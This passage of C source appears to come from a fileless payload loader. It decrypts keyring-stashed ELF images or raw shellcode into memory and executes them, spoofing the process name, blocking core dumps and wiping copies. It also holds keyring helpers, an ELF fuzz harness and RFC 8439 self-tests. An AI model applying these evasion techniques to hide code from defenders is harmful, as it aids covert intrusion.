                    failed = 1;
                    break;
                }
            }
            kr_sha256_update(&hc, scratch + KR_V4_AAD_LEN, pl);
            if (v4_scatter(&main_img, scratch + KR_V4_AAD_LEN,
                           (uint64_t)i * KR_V4_PT_CHUNK, pl, err) != 0) {
                failed = 1;
                break;
            }
            volatile_wipe(scratch, KR_V4_AAD_LEN + pl);
        }
        if (!failed) {
            kr_sha256_final(&hc, calc);
            if (memcmp(calc, wire + 8, 32) != 0) {
                seterr(err, "load: integrity digest MISMATCH — stash is "
                      "corrupt or was modified after stash; refusing to "
                      "execute");
                failed = 1;
            }
        }
        if (!failed) {
            /* deferred final protections: W^X as usual, applied only
             * after the whole image streamed in and verified */
            for (int ri = 0; ri < main_img.nranges; ri++) {
                if (mprotect((void *)main_img.ranges[ri].start,
                             (size_t)(main_img.ranges[ri].end -
                                      main_img.ranges[ri].start),
                             (int)main_img.ranges[ri].prot) == -1) {
                    seterr(err, "payload: mprotect streamed PT_LOAD -> %d "
                          "failed: %s", (int)main_img.ranges[ri].prot,
                          strerror(errno));
                    failed = 1;
                    break;
                }
            }
        }
        if (failed) {
            for (int ri = 0; ri < main_img.nranges; ri++) {
                uint64_t st = main_img.ranges[ri].start;

                if (st)
                    munmap((void *)st, (size_t)(main_img.ranges[ri].end - st));
            }
            goto out_scratch;
        }
        kr_logf("v4: streamed %u chunk(s), max scratch %zu bytes", total,
                scratch_sz);
        volatile_wipe(wire, wirelen);      /* ciphertext hygiene */
        free(wire);
        wire = NULL;
        rc = stage_and_enter(&main_img, scratch + KR_V4_AAD_LEN, o, argc,
                             argv, envp, scratch, scratch_sz, err);
        /* stage_and_enter wiped the scratch (or never returned) */
        free(scratch);
        scratch = NULL;
        volatile_wipe(key, sizeof key);
        return rc;
    }

out_scratch:
    if (scratch) {
        volatile_wipe(scratch, scratch_sz);
        free(scratch);
    }
    volatile_wipe(key, sizeof key);
out_wire:
    if (wire) {
        volatile_wipe(wire, wirelen);
        free(wire);
    }
    return rc == 0 ? 0 : -1;
}

int kr_exec_image(const void *img, size_t len, const kr_opts *o,
                  int argc, char **argv, char **envp, char err[KR_ERRSZ])
{
    uint64_t entry, at_phdr = 0, at_phent = 0, at_phnum = 0, at_base = 0;
    const char *via;
    int want_clone = o && o->clone_child;

    if (!img || !len || !argv || argc < 1 || !argv[0] || !argv[0][0])
        return seterr(err, "exec: invalid arguments");

    /*
     * ---- Phase 0: execution hardening (all paths) ----
     * Name spoof + PR_SET_DUMPABLE(0) BEFORE the payload image exists
     * in memory. Dumpable failure is fatal.
     */
    if (exec_hardening(argv[0], err) != 0)
        return -1;

    /*
     * ---- Wire v4 (experimental): an ENCRYPTED KRH4 handoff from
     * kr_load_revoke streams — per-chunk AEAD straight into the mapped
     * image, never a full plaintext buffer. Refuse the combinations
     * the streaming design cannot honor yet instead of shipping a
     * buffer-rebuilding fallback.
     */
    if (len >= KR_HDR4_LEN && memcmp(img, KR_WIRE4_MAGIC, 4) == 0 &&
        ((const uint8_t *)img)[5] & KR_HDR4_FLAG_ENC) {
        if (o && o->selfcontained)
            return seterr(err, "exec: v4 experimental: not with "
                          "--selfcontained yet");
        return exec_v4_stream(o, (uint8_t *)(uintptr_t)img, len,
                              argc, argv, envp, err);
    }

    if (o && o->raw) {
        /*
         * Raw shellcode: skip ALL ELF validation and mapping logic; one
         * RWX region, payload copied in, then the normal enter() path
         * with entry = region start (keys are already revoked at this
         * point).
         */
        size_t rlen = (size_t)page_up(len);
        void *region = mmap(NULL, rlen, PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if (region == MAP_FAILED)
            return seterr(err, "exec: raw region mmap failed: %s",
                          strerror(errno));
        harden_anon(region, rlen, 1, "raw shellcode region", KR_VMA_IMAGE);
        memcpy(region, img, len);
        entry = (uint64_t)region;
        at_phdr = 0;
        at_phent = 0;
        at_phnum = 0;
        at_base = 0;
        via = "raw shellcode";
        kr_logf("exec: raw shellcode, %zu bytes at 0x%08" PRIx64, len, entry);
        /* the mapped region is now the only live copy of the payload */
        volatile_wipe((void *)(uintptr_t)img, len);
        if (want_clone) {
            kr_clone_stage_t st = {
                entry, 0, 0, 0, 0, entry,
                argv[0], argv, argc, envp, via, err
            };
            return run_in_clone_child(&st, o ? o->child_pid_out : NULL, err);
        }
        return enter_process(entry, argv[0], argv, argc, envp,
                             at_phdr, at_phent, at_phnum, entry, at_base,
                             via, err);
    }

    const Elf64_Ehdr *eh;
    const Elf64_Phdr *ph_unused;

    if (validate_elf(img, len, "payload", &eh, &ph_unused, err) != 0) {
        if (len >= 3 && memcmp(img, KR_MAGIC, 3) == 0)
            seterr(err, "payload: KR1 encrypted envelope — decrypt it first "
                   "(kr_load_revoke with the key)");
        return -1;
    }

    /* ---- Phase 3.2: map the main image ---- */
    image_t main_img;

    if (load_image(img, len, "payload",
                   eh->e_type == ET_EXEC ? BASE_FIXED_ZERO : BASE_PROBE,
                   0, &main_img, err) != 0)
        return -1;

    return stage_and_enter(&main_img, img, o, argc, argv, envp,
                           (uint8_t *)(uintptr_t)img, len, err);
}


/* ===================================================================== */
/* --call SYM: relocate a self-contained .so and call one function        */
/* (x86-64 only: the relocator implements R_X86_64_* types)               */
/* ===================================================================== */

#ifndef __aarch64__
struct call_symtab {
    const Elf64_Shdr *symtab_sh;
    const Elf64_Sym  *syms;
    size_t            nsyms;
    const char       *str;
    size_t            strsz;
};

/* parse e_shoff, find SHT_SYMTAB (+ its linked SHT_STRTAB) */
static int call_find_symtab(const uint8_t *d, size_t n, const Elf64_Ehdr *eh,
                            struct call_symtab *out, char *err)
{
    memset(out, 0, sizeof *out);
    if (eh->e_shentsize != sizeof(Elf64_Shdr))
        return seterr(err, "call: e_shentsize %" PRIu16 " != %zu",
                      eh->e_shentsize, sizeof(Elf64_Shdr));
    if (eh->e_shoff == 0 || eh->e_shoff % _Alignof(Elf64_Shdr) != 0 ||
        kr_oob(eh->e_shoff, (uint64_t)eh->e_shnum * sizeof(Elf64_Shdr), n))
        return seterr(err, "call: no/broken section header table (stripped, "
                      "misaligned, or non-ELF object?)");

    const Elf64_Shdr *sh = (const Elf64_Shdr *)(d + eh->e_shoff);

    for (uint16_t i = 0; i < eh->e_shnum; i++) {
        if (sh[i].sh_type != SHT_SYMTAB)
            continue;
        if (sh[i].sh_offset % _Alignof(Elf64_Sym) != 0 ||
            kr_oob(sh[i].sh_offset, sh[i].sh_size, n))
            return seterr(err, "call: SHT_SYMTAB out of bounds or "
                          "misaligned");
        if (sh[i].sh_link >= eh->e_shnum)
            return seterr(err, "call: SHT_SYMTAB sh_link out of range");
        const Elf64_Shdr *strsh = &sh[sh[i].sh_link];

        if (kr_oob(strsh->sh_offset, strsh->sh_size, n))
            return seterr(err, "call: symbol string table out of bounds");
        out->symtab_sh = &sh[i];
        out->syms = (const Elf64_Sym *)(d + sh[i].sh_offset);
        out->nsyms = sh[i].sh_size / sizeof(Elf64_Sym);
        out->str = (const char *)(d + strsh->sh_offset);
        out->strsz = strsh->sh_size;
        return 0;
    }
    return seterr(err, "call: no SHT_SYMTAB section — --call needs an "
                  "unstripped, self-contained (-nostdlib) shared object");
}

/* find a defined symbol by name; returns 0 / -1+err */
static int call_find_symbol(const struct call_symtab *st, const char *name,
                            uint64_t *st_value_out, char *err)
{
    size_t namelen = strlen(name);

    for (size_t i = 0; i < st->nsyms; i++) {
        const Elf64_Sym *s = &st->syms[i];

        if (s->st_shndx == SHN_UNDEF || s->st_name >= st->strsz)
            continue;
        const char *nm = st->str + s->st_name;

        if (strncmp(nm, name, namelen) == 0 && nm[namelen] == '\0') {
            *st_value_out = s->st_value;
            return 0;
        }
    }
    return seterr(err, "call: symbol \"%s\" not found among %zu defined "
                  "SHT_SYMTAB symbol(s)", name, st->nsyms);
}

/* mprotect every PT_LOAD of the mapped image to RW (1) or final prot (0) */
static int call_protect_loads(const image_t *img, int rw, char *err)
{
    const Elf64_Ehdr *eh = img->ehdr;

    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &img->phdr[i];

        if (p->p_type != PT_LOAD || p->p_memsz == 0)
            continue;
        uint64_t vstart = page_down(img->base + p->p_vaddr);
        uint64_t vend   = page_up(img->base + p->p_vaddr + p->p_memsz);
        int prot = PROT_READ | PROT_WRITE;

        if (!rw) {
            prot = 0;
            if (p->p_flags & PF_R) prot |= PROT_READ;
            if (p->p_flags & PF_W) prot |= PROT_WRITE;
            if (p->p_flags & PF_X) prot |= PROT_EXEC;
        }
        if (mprotect((void *)vstart, (size_t)(vend - vstart), prot) == -1)
            return seterr(err, "call: mprotect PT_LOAD %u -> %d failed: %s",
                          i, prot, strerror(errno));
    }
    return 0;
}

/*
 * Apply relocations in place on the mapped image. Only R_X86_64_RELATIVE
 * and R_X86_64_64 / R_X86_64_GLOB_DAT against locally defined symbols
 * are handled; anything else (or an undefined symbol) is a clean error
 * — ld.so-style relocation (IRELATIVE, JUMP_SLOT, ...) is deliberately
 * not attempted.
 */
static int call_apply_relocations(const uint8_t *d, size_t n,
                                  const Elf64_Ehdr *eh, const image_t *img,
                                  const struct call_symtab *st, char *err)
{
    if (eh->e_shoff == 0 || eh->e_shoff % _Alignof(Elf64_Shdr) != 0 ||
        kr_oob(eh->e_shoff, (uint64_t)eh->e_shnum * sizeof(Elf64_Shdr), n))
        return 0;                        /* no sections: nothing to relocate */

    const Elf64_Shdr *sh = (const Elf64_Shdr *)(d + eh->e_shoff);

    for (uint16_t i = 0; i < eh->e_shnum; i++) {
        const Elf64_Shdr *s = &sh[i];

        if (s->sh_type != SHT_RELA)
            continue;
        if (s->sh_offset % _Alignof(Elf64_Rela) != 0 ||
            kr_oob(s->sh_offset, s->sh_size, n))
            return seterr(err, "call: SHT_RELA section %u out of bounds or "
                          "misaligned", i);

        size_t nrela = s->sh_size / sizeof(Elf64_Rela);
        const Elf64_Rela *rela = (const Elf64_Rela *)(d + s->sh_offset);

        for (size_t r = 0; r < nrela; r++) {
            uint64_t off  = (uint64_t)rela[r].r_offset;
            uint32_t type = (uint32_t)ELF64_R_TYPE(rela[r].r_info);
            uint32_t symi = (uint32_t)ELF64_R_SYM(rela[r].r_info);
            int64_t  add  = rela[r].r_addend;

            /*
             * The write target must land inside a range ACTUALLY mapped by
             * map_pt_loads (recorded in img->ranges).  A span-only check is
             * wrong twice over: the gap between segments is not mapped, and
             * vaddr arithmetic can wrap.  off is in image-relative vaddr
             * space; ranges are absolute (base already added).
             */
            int in_load = 0;

            for (int ri = 0; ri < img->nranges; ri++) {
                /* the segment must contain the target AND be writable at
                 * relocation time — a p_flags=0 segment maps PROT_NONE and
                 * writing it faults (found by test/fuzz_elf) */
                if ((img->ranges[ri].prot & PROT_WRITE) &&
                    img->base + off >= img->ranges[ri].start &&
                    !kr_oob(img->base + off, 8, img->ranges[ri].end)) {
                    in_load = 1;
                    break;
                }
            }
            if (!in_load)
                return seterr(err, "call: relocation offset 0x%" PRIx64
                              " outside any mapped writable PT_LOAD segment",
                              off);
            uint64_t *target = (uint64_t *)(img->base + off);

            switch (type) {
            case KR_R_X86_64_RELATIVE:
                *target = img->base + (uint64_t)add;
                break;
            case KR_R_X86_64_64:
            case KR_R_X86_64_GLOB_DAT: {
                if (!st->syms || symi >= st->nsyms)
                    return seterr(err, "call: relocation type %u references "
                                  "symbol %u but no usable SHT_SYMTAB exists",
                                  type, symi);
                const Elf64_Sym *sym = &st->syms[symi];

                if (sym->st_shndx == SHN_UNDEF) {
                    const char *nm = "<out-of-range>";

                    if (sym->st_name < st->strsz)
                        nm = st->str + sym->st_name;
                    return seterr(err, "call: relocation references undefined "
                                  "symbol \"%s\" — only self-contained "
                                  "(-nostdlib) shared objects are supported",
                                  nm);
                }
                uint64_t sv = sym->st_shndx == SHN_ABS
                              ? sym->st_value
                              : img->base + sym->st_value;

                *target = sv + (uint64_t)add;
                break;
            }
            default:
                return seterr(err, "call: unsupported ELF relocation type %u "
                              "at offset 0x%" PRIx64 " — only R_X86_64_RELATIVE/"
                              "64/GLOB_DAT are applied (ld.so-style relocation "
                              "is not attempted)", type, off);
            }
        }
    }
    return 0;
}
#endif /* !__aarch64__ */

int kr_call_symbol(const void *elf, size_t len, const kr_opts *o,
                   int argc, char **argv, char **envp,
                   long *retval, char err[KR_ERRSZ])
{
#ifdef __aarch64__
    (void)elf; (void)len; (void)o; (void)argc; (void)argv; (void)envp;
    (void)retval;
    return seterr(err, "call: --call is x86-64-only in this release "
                  "(the in-loader relocator implements R_X86_64_* "
                  "relocations only)");
#else
    if (!elf || !len || !o || !o->call_symbol || !o->call_symbol[0])
        return seterr(err, "call: invalid arguments");
    if (!argv || argc < 1 || !argv[0])
        return seterr(err, "call: invalid argv");

    /*
     * wire v4 + --call: the DELIBERATE, documented full-buffer exception
     * to the v4 streaming property. --call applies relocations from the
     * section table (e_phoff headers, SHT_RELA, SHT_SYMTAB), and those
     * bytes live in the FILE IMAGE outside the PT_LOADs — the streaming
     * design only ever materializes PT_LOAD bytes, by design. So this
     * exec path decrypts the per-chunk body into ONE plaintext buffer
     * (chunk by chunk through the bounded scratch, whole-stash digest
     * verified) via the buffer reader, then runs the unchanged --call
     * pipeline on it. Streaming remains the path for plain exec, --raw
     * and --clone.
     */
    if (len >= KR_HDR4_LEN && memcmp(elf, KR_WIRE4_MAGIC, 4) == 0 &&
        ((const uint8_t *)elf)[5] & KR_HDR4_FLAG_ENC) {
        uint8_t *pt = NULL;
        size_t ptlen = 0;

        kr_logf("v4: full-buffer decrypt (--call relocation path; streaming "
                "applies to jump exec)");
        /* wire_open_v4 consumes (wipes+frees) the ciphertext wire and
         * returns the malloc'd, digest-verified plaintext image */
        if (wire_open_v4(o, (uint8_t *)(uintptr_t)elf, len, &pt, &ptlen,
                         err) != 0)
            return -1;
        elf = pt;
        len = ptlen;
    }

    /*
     * ---- execution hardening (all exec paths) ----
     * Name spoof + PR_SET_DUMPABLE(0) BEFORE the image exists in
     * memory. Dumpable failure is fatal.
     */
    if (exec_hardening(argv[0], err) != 0)
        return -1;

    const Elf64_Ehdr *eh;
    const Elf64_Phdr *ph_unused;

    if (validate_elf(elf, len, "payload", &eh, &ph_unused, err) != 0)
        return -1;

    image_t img;

    if (load_image(elf, len, "payload",
                   eh->e_type == ET_EXEC ? BASE_FIXED_ZERO : BASE_PROBE,
                   0, &img, err) != 0)
        return -1;

    struct call_symtab st;

    if (call_find_symtab(elf, len, eh, &st, err) != 0)
        return -1;

    uint64_t st_value = 0;

    if (call_find_symbol(&st, o->call_symbol, &st_value, err) != 0)
        return -1;

    /* relocations are patched while the image is RW, then prot restored */
    if (call_protect_loads(&img, 1, err) != 0)
        return -1;
    if (call_apply_relocations(elf, len, eh, &img, &st, err) != 0)
        return -1;
    if (call_protect_loads(&img, 0, err) != 0)
        return -1;

    kr_logf("call: \"%s\" at base 0x%08" PRIx64 " + 0x%" PRIx64
            ", %zu defined symbol(s) available",
            o->call_symbol, img.base, st_value, st.nsyms);

    /*
     * Guard: every chunk key was already revoked by kr_load_revoke()
     * before this call, so the function can only run after the revokes
     * completed. It runs on the normal stack and RETURNS.
     *
     * Zeroize the reassembled source buffer immediately before the
     * call: relocations were applied in place on the mapped image,
     * which is now the ONLY live copy of the payload.
     */
    volatile_wipe((void *)(uintptr_t)elf, len);

    int (*fn)(int, char **, char **) =
        (int (*)(int, char **, char **))(uintptr_t)(img.base + st_value);

    *retval = fn(argc, argv, envp);
    return 0;
#endif
}

/* ===================================================================== */
/* wire v2.2: keygen / keepalive / probes                                 */
/* ===================================================================== */

/* clone() smoke child: _exit(0) — waitpid on the exact pid proves it ran */
static int smoke_child_exit(void *arg)
{
    (void)arg;
    _exit(0);
}

int kr_keygen(char hexout[KR_KEY_HEX_LEN + 1], char err[KR_ERRSZ])
{
    uint8_t key[32];

    if (kr_random(key, sizeof key) != 0)
        return seterr(err, "keygen: cannot obtain randomness "
                      "(getrandom/urandom unavailable)");
    hex32_encode(key, hexout);
    volatile_wipe(key, sizeof key);
    return 0;
}

long kr_keepalive_beat(const kr_opts *o, char err[KR_ERRSZ])
{
    const char *prefix = o && o->desc_prefix ? o->desc_prefix : KR_DEFAULT_DESC;
    char desc[DESC_MAX];
    long pring;

    if (strlen(prefix) + 5 > DESC_MAX)
        return seterr(err, "keepalive: prefix \"%s\" too long", prefix);
    /*
     * GET_PERSISTENT doubles as the expiry refresh: every beat pushes
     * the ring's expiry clock out by persistent_keyring_expiry again.
     * (This kernel rejects dest serial 0 with EINVAL; persistent_ring()
     * retries with the user keyring as dest.)
     */
    pring = persistent_ring(err);
    if (pring == -1)
        return -1;

    chunk_desc(desc, sizeof desc, prefix, 0);
    for (size_t t = 0; t < KR_N_KEY_TYPES; t++) {
        long s = syscall(__NR_keyctl, KEYCTL_SEARCH, pring, kr_key_types[t],
                         desc, 0UL);

        if (s != -1)
            return s;
        if (errno == ENOKEY)
            continue;
        if (errno == EKEYREVOKED)
            continue;              /* stale chunk: report as absent */
        seterr(err, "keepalive: KEYCTL_SEARCH(%s) failed: %s", desc,
               strerror(errno));
        return -1;
    }
    return 0;                      /* ring alive, chunk000 absent */
}

/*
 * gc — sweep every visible keyring key matching "<prefix>.*" (user and
 * big_key types, /proc/keys inventory like list) and destroy it with
 * KEYCTL_INVALIDATE: unlinks it from every ring and kills the payload
 * immediately, including revoked ghosts of consumed stashes. Root can
 * invalidate any key by serial; unprivileged callers only their own.
 * Returns 0 (counts reported via kr_logf) / -1+err on /proc/keys failure.
 */
int kr_gc(const char *prefix, char err[KR_ERRSZ])
{
    const char *pfx = prefix ? prefix : KR_DEFAULT_DESC;
    char with_dot[DESC_MAX];

    if (snprintf(with_dot, sizeof with_dot, "%s.", pfx) >= (int)sizeof with_dot)
        return seterr(err, "gc: prefix \"%s\" too long", pfx);

    FILE *f = fopen("/proc/keys", "r");

    if (!f)
        return seterr(err, "gc: cannot open /proc/keys: %s", strerror(errno));

    char line[1024];
    int killed = 0, skipped = 0;

    while (fgets(line, sizeof line, f)) {
        char serial[32], flags[32], quota[32], usage_[32];
        char perms[32], uid[32], gid[32], type[32];
        int off = 0;

        if (sscanf(line, "%31s %31s %31s %31s %31s %31s %31s %31s %n",
                   serial, flags, quota, usage_, perms, uid, gid, type,
                   &off) != 8)
            continue;
        if (strcmp(type, "user") != 0 && strcmp(type, "big_key") != 0)
            continue;
        char *desc = line + off;

        while (*desc == ' ' || *desc == '\t')
            desc++;
        size_t dl = strlen(desc);

        while (dl && (desc[dl - 1] == '\n' || desc[dl - 1] == '\r'))
            desc[--dl] = '\0';
        if (strncmp(desc, with_dot, strlen(with_dot)) != 0)
            continue;
        long s = strtol(serial, NULL, 16);   /* /proc/keys serials are hex */

        if (s <= 0)
            continue;
        if (syscall(__NR_keyctl, KEYCTL_INVALIDATE, s, 0, 0) == -1) {
            skipped++;
            kr_logf("gc: key %ld (\"%s\") not invalidated: %s",
                    s, desc, strerror(errno));
        } else {
            killed++;
        }
    }
    fclose(f);
    kr_logf("gc: destroyed %d key(s) matching %s* (%d skipped)",
            killed, with_dot, skipped);
    return 0;
}

int kr_alg_probe(char err[KR_ERRSZ])
{
    struct sockaddr_alg sa;

    memset(&sa, 0, sizeof sa);
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "hash");
    strcpy((char *)sa.salg_name, "sha256");
    int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);

    if (fd < 0)
        return seterr(err, "preflight: socket(AF_ALG) failed: %s",
                      strerror(errno));
    if (bind(fd, (struct sockaddr *)&sa, sizeof sa) != 0) {
        int e = errno;

        close(fd);
        return seterr(err, "preflight: AF_ALG bind \"hash\"/\"sha256\" "
                      "failed: %s", strerror(e));
    }
    close(fd);

    memset(&sa, 0, sizeof sa);
    sa.salg_family = AF_ALG;
    strcpy((char *)sa.salg_type, "aead");
    strcpy((char *)sa.salg_name, "rfc7539(chacha20,poly1305)");
    fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (fd < 0)
        return seterr(err, "preflight: socket(AF_ALG) failed: %s",
                      strerror(errno));
    if (bind(fd, (struct sockaddr *)&sa, sizeof sa) != 0) {
        int e = errno;

        close(fd);
        return seterr(err, "preflight: AF_ALG bind \"aead\"/"
                      "\"rfc7539(chacha20,poly1305)\" failed: %s",
                      strerror(e));
    }
    close(fd);
    return 0;
}

int kr_clone_smoke(char err[KR_ERRSZ])
{
    /*
     * Spawn a child that _exit(0)s and waitpid() it. No pipe side
     * channel: with CLONE_FILES the fd table is SHARED, so a byte
     * written by the child races the parent's close() of the write end.
     * The specific pid exiting 0 through waitpid is the proof.
     */
    uint8_t *cstk = mmap(NULL, (size_t)page_size(), PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);

    if (cstk == MAP_FAILED)
        return seterr(err, "preflight: clone smoke mmap failed: %s",
                      strerror(errno));
    errno = 0;
    long pid = clone(smoke_child_exit, cstk + page_size(),
                     CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND |
                     SIGCHLD, NULL);

    if (pid == -1) {
        int e = errno;

        munmap(cstk, (size_t)page_size());
        return seterr(err, "preflight: clone(CLONE_VM) failed: %s",
                      strerror(e ? e : EINVAL));
    }
    int status = 0;

    while (waitpid((pid_t)pid, &status, 0) == -1) {
        if (errno != EINTR)
            break;
    }
    munmap(cstk, (size_t)page_size());
    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0)
        return seterr(err, "preflight: clone smoke child misbehaved "
                      "(status=%d)", status);
    return 0;
}

/* ===================================================================== */
/* self-test: RFC 8439 2.8.2 AEAD vector + roundtrip via AF_ALG           */
/* ===================================================================== */

/* RFC 8439 section 2.8.2 test vector (exact published values) */
static const uint8_t st_key[32] = {
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x9e, 0x9f
};
static const uint8_t st_nonce[12] = {
    0x07, 0x00, 0x00, 0x00, 0x40, 0x41, 0x42, 0x43,
    0x44, 0x45, 0x46, 0x47
};
static const uint8_t st_aad[12] = {
    0x50, 0x51, 0x52, 0x53, 0xc0, 0xc1, 0xc2, 0xc3,
    0xc4, 0xc5, 0xc6, 0xc7
};
static const uint8_t st_pt[114] = {
    'L', 'a', 'd', 'i', 'e', 's', ' ', 'a', 'n', 'd', ' ', 'G', 'e', 'n', 't', 'l',
    'e', 'm', 'e', 'n', ' ', 'o', 'f', ' ', 't', 'h', 'e', ' ', 'c', 'l', 'a', 's',
    's', ' ', 'o', 'f', ' ', 0x27, '9', '9', ':', ' ', 'I', 'f', ' ', 'I', ' ', 'c',
    'o', 'u', 'l', 'd', ' ', 'o', 'f', 'f', 'e', 'r', ' ', 'y', 'o', 'u', ' ', 'o',
    'n', 'l', 'y', ' ', 'o', 'n', 'e', ' ', 't', 'i', 'p', ' ', 'f', 'o', 'r', ' ',
    't', 'h', 'e', ' ', 'f', 'u', 't', 'u', 'r', 'e', ',', ' ', 's', 'u', 'n', 's',
    'c', 'r', 'e', 'e', 'n', ' ', 'w', 'o', 'u', 'l', 'd', ' ', 'b', 'e', ' ', 'i',
    't', '.'
};
static const uint8_t st_ct[114] = {
    0xd3, 0x1a, 0x8d, 0x34, 0x64, 0x8e, 0x60, 0xdb,
    0x7b, 0x86, 0xaf, 0xbc, 0x53, 0xef, 0x7e, 0xc2,
    0xa4, 0xad, 0xed, 0x51, 0x29, 0x6e, 0x08, 0xfe,
    0xa9, 0xe2, 0xb5, 0xa7, 0x36, 0xee, 0x62, 0xd6,
    0x3d, 0xbe, 0xa4, 0x5e, 0x8c, 0xa9, 0x67, 0x12,
    0x82, 0xfa, 0xfb, 0x69, 0xda, 0x92, 0x72, 0x8b,
    0x1a, 0x71, 0xde, 0x0a, 0x9e, 0x06, 0x0b, 0x29,
    0x05, 0xd6, 0xa5, 0xb6, 0x7e, 0xcd, 0x3b, 0x36,
    0x92, 0xdd, 0xbd, 0x7f, 0x2d, 0x77, 0x8b, 0x8c,
    0x98, 0x03, 0xae, 0xe3, 0x28, 0x09, 0x1b, 0x58,
    0xfa, 0xb3, 0x24, 0xe4, 0xfa, 0xd6, 0x75, 0x94,
    0x55, 0x85, 0x80, 0x8b, 0x48, 0x31, 0xd7, 0xbc,
    0x3f, 0xf4, 0xde, 0xf0, 0x8e, 0x4b, 0x7a, 0x9d,
    0xe5, 0x76, 0xd2, 0x65, 0x86, 0xce, 0xc6, 0x4b,
    0x61, 0x16
};
static const uint8_t st_tag[16] = {
    0x1a, 0xe1, 0x0b, 0x59, 0x4f, 0x09, 0xe2, 0x6a,
    0x7e, 0x90, 0x2e, 0xcb, 0xd0, 0x60, 0x06, 0x91
};

/*
 * ELF-loader fuzz entry: push an untrusted image through the phase-3
 * parsers WITHOUT ever jumping.  Modes:
 *   0 = validate_elf only
 *   1 = validate + find_pt_interp
 *   2 = validate + load_image (maps the PT_LOADs) + munmap
 *   3 = x86-64: the full --call pre-jump path (validate, load, symtab,
 *       symbol lookup, relocations, protect_loads), then munmap
 * Returns 0 (accepted) / -1 (rejected) / -2 (mode unsupported on this
 * build).  Used by test/fuzz_elf.c.
 */
int kr_elf_fuzz_entry(const uint8_t *img, size_t len, int mode,
                      char err[KR_ERRSZ])
{
    if (!img || !len)
        return -1;

    uint8_t *d = malloc(len);

    if (!d)
        return -1;
    memcpy(d, img, len);

    const Elf64_Ehdr *eh;
    const Elf64_Phdr *ph;
    int rc = -1;

    switch (mode) {
    case 0:
        rc = validate_elf(d, len, "fuzz", &eh, &ph, err);
        break;
    case 1: {
        char path[4096];
        rc = find_pt_interp(d, len, path, sizeof path, err);
        break;
    }
    case 2:
    case 3: {
        image_t img_s;
        base_mode_t bm;

        rc = validate_elf(d, len, "fuzz", &eh, &ph, err);
        if (rc != 0)
            break;
        bm = eh->e_type == ET_EXEC ? BASE_FIXED_ZERO : BASE_PROBE;
        if (load_image(d, len, "fuzz", bm, 0, &img_s, err) != 0) {
            rc = -1;
            break;
        }
#if defined(__x86_64__) && !defined(KR_NO_CALL_FUZZ)
        if (mode == 3) {
            struct call_symtab st;
            uint64_t symval = 0;

            if (call_find_symtab(d, len, eh, &st, err) == 0) {
                (void)call_find_symbol(&st, "kratest", &symval, err);
                if (call_apply_relocations(d, len, eh, &img_s, &st,
                                           err) != 0)
                    rc = -1;
                else if (call_protect_loads(&img_s, 0, err) != 0)
                    rc = -1;
            } else {
                rc = -1;
            }
        }
#else
        if (mode == 3)
            rc = -2;
#endif
        /* unmap exactly what load_image mapped (recorded ranges), even
         * on partial failure */
        for (int ri = 0; ri < img_s.nranges; ri++) {
            uint64_t st = img_s.ranges[ri].start, en = img_s.ranges[ri].end;

            if (st && en > st && st < (1ULL << 47))
                munmap((void *)st, (size_t)(en - st));
        }
        rc = rc == -1 ? -1 : 0;
        break;
    }
    default:
        rc = -2;
    }
    volatile_wipe(d, len);
    free(d);
    return rc;
}

/* compare a lowercase hex string against raw bytes (selftest KATs) */
static int hex_eq_str(const char *hex, const uint8_t *b, size_t n)
{
    for (size_t i = 0; i < n; i++) {
        char t[3] = { hex[2 * i], hex[2 * i + 1], 0 };
        char *end = NULL;
        long v = strtol(t, &end, 16);

        if (end != t + 2 || (uint8_t)v != b[i])
            return 0;
    }
    return 1;
}

int kr_selftest(char err[KR_ERRSZ])
{
    uint8_t out[256];
    int r;

    /* 1: encrypt the RFC vector — AF_ALG must reproduce ct and tag */
    r = aead_op(0, st_key, st_aad, sizeof st_aad, st_pt, sizeof st_pt,
                st_nonce, out, err);
    if (r != 0)
        return -1;
    if (memcmp(out, st_aad, sizeof st_aad) != 0 ||
        memcmp(out + sizeof st_aad, st_ct, sizeof st_ct) != 0 ||
        memcmp(out + sizeof st_aad + sizeof st_ct, st_tag, sizeof st_tag) != 0)
        return seterr(err, "selftest: RFC 8439 2.8.2 encrypt vector mismatch "
                      "via AF_ALG");

    /* 2: decrypt the published ct||tag back to the plaintext */
    {
        uint8_t cttag[130];

        memcpy(cttag, st_ct, sizeof st_ct);
        memcpy(cttag + sizeof st_ct, st_tag, sizeof st_tag);
        r = aead_op(1, st_key, st_aad, sizeof st_aad, cttag, sizeof cttag,
                    st_nonce, out, err);
        if (r != 0)
            return -1;
        if (memcmp(out, st_aad, sizeof st_aad) != 0 ||
            memcmp(out + sizeof st_aad, st_pt, sizeof st_pt) != 0)
            return seterr(err, "selftest: RFC 8439 2.8.2 decrypt vector "
                          "mismatch via AF_ALG");
    }

    /* 3: a flipped tag bit must be rejected (EBADMSG) */
    {
        uint8_t cttag[130];

        memcpy(cttag, st_ct, sizeof st_ct);
        memcpy(cttag + sizeof st_ct, st_tag, sizeof st_tag);
        cttag[129] ^= 0x01;
        r = aead_op(1, st_key, st_aad, sizeof st_aad, cttag, sizeof cttag,
                    st_nonce, out, err);
        if (r == 0)
            return seterr(err, "selftest: tampered tag was NOT rejected");
    }

    /* 4: random roundtrip through the KR1 envelope path */
    {
        uint8_t key[32], *env = NULL, *back = NULL;
        size_t envlen = 0, backlen = 0;
        uint8_t blob[1024];

        for (size_t i = 0; i < sizeof blob; i++)
            blob[i] = (uint8_t)(i * 7 + 3);
        if (kr_random(key, sizeof key) != 0)
            return seterr(err, "selftest: cannot obtain key randomness");
        if (envelope_seal(key, blob, sizeof blob, &env, &envlen, err) != 0)
            return -1;
        if (envlen != sizeof blob + KR_ENV_OVERHEAD) {
            free(env);
            return seterr(err, "selftest: unexpected envelope size %zu",
                          envlen);
        }
